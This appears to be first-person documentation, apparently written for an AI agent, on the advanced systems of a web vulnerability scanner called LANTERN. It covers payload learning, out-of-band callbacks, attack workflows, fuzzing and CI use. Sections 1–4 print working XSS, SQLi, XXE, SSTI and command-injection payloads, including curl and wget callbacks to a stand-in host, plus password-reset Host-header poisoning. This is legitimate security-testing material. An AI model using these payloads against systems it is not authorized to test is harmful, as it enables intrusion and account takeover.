# LANTERN Advanced Systems

Beyond basic modules, LANTERN has sophisticated systems that I need to 
understand to use it effectively. This is critical for advanced operations.

---

## 1. LEARNED PAYLOADS SYSTEM

LANTERN learns from successful attacks and stores payloads for reuse.

### How It Works

```
1. LANTERN sends payload, gets successful result
2. Payload recorded with context (target, WAF, tech)
3. Next scan loads learned payloads FIRST
4. Learned payloads prioritized over static payloads
```

### Storage Location

```
payloads/learned/
├── index.json      ← Master index with metadata
├── xss.txt         ← Learned XSS payloads
├── sqli.txt        ← Learned SQLi payloads
├── lfi.txt         ← Learned LFI payloads
├── redirect.txt    ← Learned redirect payloads
└── websocket.txt   ← Learned WebSocket payloads
```

### Recording Payloads

```python
from core.learned import (
    record_successful_payload,
    record_successful_mutation,
    record_waf_bypass,
    save_learned_payloads,
    get_learned_stats
)

record_successful_payload("xss", "<img src=x onerror=alert(1)>", {
    "target": "https://target.com",
    "tech": "Flask",
    "context": "attribute_injection"
})

record_successful_mutation("sqli", 
    original="' OR '1'='1",
    mutation="'/**/OR/**/1=1",
    target="https://target.com"
)

record_waf_bypass("xss", "<img/src=x/onerror=alert(1)>", 
    waf="Cloudflare",
    target="https://target.com"
)

await save_learned_payloads()
print(get_learned_stats())
```

### Loading Learned Payloads

```python
from core.learned import load_payloads_with_learned

payloads = load_payloads_with_learned("xss")
```

### Why This Matters For Me

When I suggest payloads or see LANTERN miss something:
1. I can tell LANTERN to record successful payloads
2. Next scan will use them first
3. LANTERN gets smarter with every scan

---

## 2. OUT-OF-BAND (OOB) CALLBACK SERVER

LANTERN has a built-in OOB server for definitive vulnerability confirmation.

### Starting the OOB Server

```bash
lantern -t target.com --oob-server --oob-port 8888 --oob-dns-port 5353
```

### How It Works

```
1. Generate unique token: abc123xyz
2. Create callback URL: http://my-server:8888/abc123xyz
3. Inject callback in payload
4. If vulnerable, target makes request to callback URL
5. OOB server records the interaction
6. CONFIRMED vulnerability
```

### OOB Payloads I Can Generate

**SSRF:**
```
http://my-oob-server:8888/TOKEN_HERE
```

**XXE:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://my-oob-server:8888/TOKEN_HERE">]>
<root>&xxe;</root>
```

**Command Injection:**
```
; curl http://my-oob-server:8888/TOKEN_HERE
; wget http://my-oob-server:8888/TOKEN_HERE
; nslookup TOKEN_HERE.my-oob-server
```

**XSS (Blind):**
```html
<script>fetch('http://my-oob-server:8888/TOKEN_HERE')</script>
```

**SSTI:**
```
{{config.__class__.__init__.__globals__['os'].popen('curl http://my-oob-server:8888/TOKEN_HERE').read()}}
```

### Checking for Callbacks

```python
from core.oob import OOBServer

oob = OOBServer(http_port=8888, dns_port=5353, domain="oob.local")
oob.start_background()

token = oob.generate_token()
callback_url = oob.get_callback_url(token)

time.sleep(10)

if oob.has_interaction(token):
    interactions = oob.check_interaction(token)
    print(f"CONFIRMED! Got {len(interactions)} callbacks")
    for i in interactions:
        print(f"  {i['type']} at {i['timestamp']}: {i['data']}")
```

### DNS vs HTTP Callbacks

| Type | Use Case | Bypasses |
|------|----------|----------|
| HTTP | Direct callback | Egress filtering |
| DNS | Stealth, no direct HTTP | Most firewalls allow DNS |

```bash
# DNS payload
nslookup TOKEN.oob.local
# If DNS server gets query → confirmed
```

---

## 3. WORKFLOW ENGINE (Business Logic Attacks)

LANTERN can execute multi-step business logic attacks.

### Workflow YAML Structure

```yaml
name: "Password Reset Poisoning"
description: "Test for host header injection in password reset"
baseline:
  - name: "request_reset"
    request:
      method: POST
      path: /forgot-password
      body:
        email: "victim@target.com"
    extract:
      reset_token: "regex:token=([a-f0-9]+)"
    expect:
      status: 200

attacks:
  - name: "host_injection"
    description: "Inject evil host header"
    attack_type: "host_header_injection"
    modify_step: "request_reset"
    modifications:
      headers:
        Host: "evil.com"
        X-Forwarded-Host: "evil.com"
    verify:
      - check: "response_contains"
        value: "evil.com"
      - check: "email_contains"
        value: "evil.com"
```

### Running Workflows

```bash
lantern -t target.com --workflow auth_bypass.yaml

lantern -t target.com --workflow auth_bypass.yaml --workflow-attack host_injection

lantern --list-workflows
```

### Built-in Attack Workflows

| Workflow | Attacks Included |
|----------|------------------|
| `auth_bypass.yaml` | Host injection, token prediction, session fixation |
| `payment.yaml` | Price manipulation, quantity tampering, coupon abuse |
| `race.yaml` | Coupon race, balance race, account creation race |
| `registration.yaml` | Email verification bypass, admin registration |

### Workflow Step Types

**Extract:** Pull values from responses
```yaml
extract:
  token: "regex:csrf_token=([^\"]+)"
  session_id: "cookie:PHPSESSID"
  user_id: "json:$.user.id"
```

**Expect:** Validate responses
```yaml
expect:
  status: 200
  contains: "Welcome"
  not_contains: "error"
```

**Modify:** Change requests for attacks
```yaml
modifications:
  body:
    price: 0.01
    quantity: -1
  headers:
    Host: evil.com
```

---

## 4. RESPONSE DIFFING (Blind Detection)

LANTERN compares responses to detect blind vulnerabilities.

### Differ Module

```python
from core.differ import ResponseDiffer

differ = ResponseDiffer()

baseline = differ.get_baseline(target_url)

true_response = request(url, {"id": "1 AND 1=1"})
false_response = request(url, {"id": "1 AND 1=2"})

diff_result = differ.compare(true_response, false_response)

if diff_result.significant:
    print(f"Boolean SQLi detected! Diff score: {diff_result.score}")
    print(f"Differences: {diff_result.changes}")
```

### What Gets Compared

- Response length
- Response time
- Status code
- Specific content changes
- Header changes
- Error patterns

### CLI Usage

```bash
lantern -t target.com -m sqli --diff-baseline
```

---

## 5. SMART FUZZER

Intelligent parameter fuzzing with boundary testing.

### Fuzzing Modes

| Mode | Purpose |
|------|---------|
| `boundary` | Test boundary values (0, -1, MAX_INT) |
| `type` | Test type confusion (string in int field) |
| `format` | Test format strings, special chars |
| `overflow` | Test buffer overflow payloads |

### CLI Usage

```bash
lantern -t target.com --fuzz-params

lantern -t target.com -m fuzz --aggressive
```

### Boundary Payloads

```python
BOUNDARY_VALUES = {
    "integer": [0, -1, 1, 2147483647, -2147483648, 99999999999],
    "string": ["", " ", "null", "undefined", "NaN", "Infinity"],
    "special": ["../", "..\\", "%00", "%0a", "\x00", "\n"],
    "format": ["%s", "%n", "%x", "{}", "{{}}"],
}
```

---

## 6. JAVASCRIPT ANALYZER

Deep JavaScript analysis for secrets and endpoints.

### What It Finds

- Hardcoded API keys
- AWS credentials
- Internal endpoints
- DOM sink functions
- postMessage handlers
- WebSocket URLs

### CLI Usage

```bash
lantern -t target.com --analyze-js

lantern -t target.com -m dom --analyze-js
```

### Analysis Output

```json
{
  "endpoints": [
    "/api/v1/users",
    "/api/internal/admin"
  ],
  "secrets": [
    {"type": "aws_key", "value": "AKIA...", "file": "bundle.js"}
  ],
  "dom_sinks": [
    {"sink": "innerHTML", "source": "location.hash", "file": "app.js"}
  ],
  "websockets": [
    "wss://api.target.com/ws"
  ]
}
```

---

## 7. CRAWLER

Automatic URL discovery.

### Crawl Options

```bash
lantern -t target.com --crawl

lantern -t target.com --crawl --crawl-depth 5

lantern -t target.com --crawl --exclude-pattern "logout|signout"
```

### What Gets Crawled

- HTML links (<a href>)
- JavaScript URLs
- Form actions
- API endpoints in JS
- Sitemap.xml
- robots.txt

---

## 8. SCOPE MANAGEMENT

Control what gets scanned.

### Scope File

```yaml
# scope.yaml
include:
  - "*.target.com"
  - "api.target.com"
exclude:
  - "*.cdn.target.com"
  - "logout"
  - "signout"
exclude_patterns:
  - "\\.(jpg|png|gif|css)$"
```

### CLI Usage

```bash
lantern -t target.com --scope-file scope.yaml

lantern -t target.com --include-domain api.target.com --exclude-domain cdn.target.com
```

---

## 9. AUTHENTICATION HANDLING

Scan authenticated endpoints.

### Auth Config File

```yaml
# auth.yaml
type: "session"
login:
  url: "https://target.com/login"
  method: POST
  body:
    username: "testuser"
    password: "testpass"
  success_indicator: "Welcome"
  extract:
    session_cookie: "cookie:PHPSESSID"
maintain:
  headers:
    Cookie: "PHPSESSID=${session_cookie}"
```

### CLI Usage

```bash
lantern -t target.com --auth-config auth.yaml

lantern -t target.com -H "Cookie: session=abc123"
```

---

## 10. CI/CD INTEGRATION

Integrate LANTERN into pipelines.

### Exit Codes

| Code | Meaning |
|------|---------|
| 0 | No findings above threshold |
| 1 | Findings above threshold |
| 2 | Scan error |

### CI Mode

```bash
lantern -t target.com --ci --fail-on HIGH

lantern -t target.com --ci --sarif --junit
```

### GitHub Actions Example

```yaml
- name: Security Scan
  run: |
    lantern -t ${{ env.TARGET_URL }} --ci --fail-on HIGH --sarif report.sarif
  continue-on-error: true

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: report.sarif
```

---

## 11. COLLABORATION

Multi-user scanning.

### Start Server

```bash
lantern --collab-server 0.0.0.0:8080
```

### Connect Client

```bash
lantern -t target.com --collab-client ws://team.local:8080
```

### Features

- Shared findings across team
- Deduplicated results
- Real-time updates
- Session sharing

---

## 12. TECHNOLOGY-BASED SMART SCANNING

Auto-select modules based on detected tech.

### CLI Usage

```bash
lantern -t target.com --smart

lantern -t target.com --tech-detect
```

### Tech → Module Mapping

```
Flask     → ssti, lfi, cmdi, deserial
Django    → ssti, csrf, idor, deserial
Express   → prototype, xss, ssrf, nosql
PHP       → lfi, sqli, upload, deserial
Java      → deserial, xxe, sqli, ssti
GraphQL   → graphql, idor, auth, sqli
WordPress → sqli, upload, xss, lfi
```

---

## Summary: What I Now Know How To Use

| System | Purpose | How I Use It |
|--------|---------|--------------|
| Learned Payloads | Payload evolution | Record successful attacks, prioritize learned |
| OOB Server | Confirmation | Generate tokens, check callbacks |
| Workflows | Multi-step attacks | Define business logic attack sequences |
| Differ | Blind detection | Compare responses for boolean injection |
| Fuzzer | Boundary testing | Test edge cases, type confusion |
| JS Analyzer | Secret discovery | Find endpoints, keys in JavaScript |
| Crawler | URL discovery | Map attack surface automatically |
| Scope | Control | Define what's in/out of scope |
| Auth | Sessions | Maintain authenticated state |
| CI/CD | Pipeline | Integrate into DevSecOps |
| Collab | Teamwork | Share findings across team |
| Smart | Auto-select | Choose modules based on tech |

This is the full power of LANTERN that I can leverage.
